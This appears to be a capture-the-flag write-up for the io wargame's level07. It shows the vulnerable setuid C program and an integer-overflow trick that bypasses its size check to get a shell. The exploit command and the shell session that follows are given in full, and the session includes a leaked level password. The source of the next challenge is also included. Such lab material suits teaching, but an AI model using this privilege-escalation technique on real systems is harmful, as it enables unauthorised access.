//written by bla 
#include <stdio.h>
#include <string.h>
#include <unistd.h>



int main(int argc, char **argv)
{

        int count = atoi(argv[1]);
        int buf[10];

        if(count >= 10 ) 
                return 1;

// 如果我们将count赋值为一个非常小的负数，那么count * sizeof(int) 将由于integer underflow变成一个正数
        memcpy(buf, argv[2], count * sizeof(int));

        if(count == 0x574f4c46) {
        printf("WIN!\n");
                execl("/bin/sh", "sh" ,NULL);
    } else
                printf("Not today son\n");


        return 0;
}


level7@io:/tmp/level07$ vim test.c

#include <stdio.h>
#include <stdlib.h>

int main(void)
{
     int tmp = -2147483620;
     int count = tmp * sizeof(int);
     printf("count = %d; 0x%x\n", count, count);
}

level7@io:/tmp/level07$ gcc -o test test.c              
level7@io:/tmp/level07$ ./test 
count = 112; 0x70

level7@io:/tmp/level07$ cd /levels/
level7@io:/levels$ ./level07 -2147483620 $(perl -e 'print "\x46\x4c\x4f\x57"x(40)')
WIN!
sh-4.2$ id
uid=1007(level7) gid=1007(level7) euid=1008(level8) groups=1008(level8),1007(level7),1029(nosu)
sh-4.2$ cd /home/level8
sh-4.2$ more .pass 
gQN3plSIDwulXhGQvl
sh-4.2$ 


level07_alt
/* 
    Coding by LarsH

    PJYN GIEZIRC FRD RBNE OM QNML PE ZMP PJM BMPPMI AIMHQMDFYMN AIEC R PMUP,
    TJYFJ JMBGN TJMD FIRFWYDZ NPRDLRIL CEDENQONPYPQPYED FYGJMIN.

*/

#include <stdio.h>

static int count[256];

int main(int argc, char **argv) {

    int i, j;

    if(argc == 1) {
        printf("Usage: %s words\n", argv[0]);
        return 1;
    }   

    /* Clear out the frequency buffer */
    for(i=0; i<256; i++)
        count[i] = 0;

    /* Fill the frequency buffer */
    for(j=1; argv[j]; j++)
        for(i=0; argv[j][i]; i++)
            count[argv[j][i]]++;

    /* Print out the frequency buffer */
    for(i=0; i<256; i++)
        if(count[i])
            printf("%c found %i time%s\n", i, count[i], count[i]-1?"s":"");

    return 0;
}